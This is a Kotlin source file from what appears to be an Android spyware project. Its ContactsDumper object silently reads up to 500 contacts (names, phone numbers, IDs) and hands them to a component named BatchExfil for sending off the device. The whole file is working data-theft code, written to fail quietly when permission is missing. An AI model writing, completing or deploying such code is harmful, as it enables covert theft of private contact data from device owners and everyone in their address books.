package com.sp.core.services

import android.content.Context
import android.provider.ContactsContract
import android.util.Log
import com.sp.core.util.BatchExfil
import org.json.JSONArray
import org.json.JSONObject

/**
 * Contact list dump (name + phone). READ_CONTACTS is optional - a missing
 * permission only means an empty list, never a crash.
 */
object ContactsDumper {

    private const val TAG = "ContactsDumper"
    private const val LIMIT = 500

    fun dump(ctx: Context): Int {
        val items = JSONArray()
        try {
            val projection = arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID
            )
            ctx.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, projection,
                null, null, null)?.use { c ->
                val iName = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val iNum = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                val iId = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID)
                while (c.moveToNext() && items.length() < LIMIT) {
                    val o = JSONObject()
                    o.put("name", if (iName >= 0) c.getString(iName) ?: "" else "")
                    o.put("number", if (iNum >= 0) c.getString(iNum) ?: "" else "")
                    o.put("id", if (iId >= 0) c.getLong(iId) else 0)
                    items.put(o)
                }
            }
        } catch (t: Throwable) {
            Log.w(TAG, "contacts unavailable: ${t.message}")
        }
        if (items.length() == 0) return 0
        BatchExfil.enqueue(ctx, "contact", items.toString())
        return items.length()
    }
}
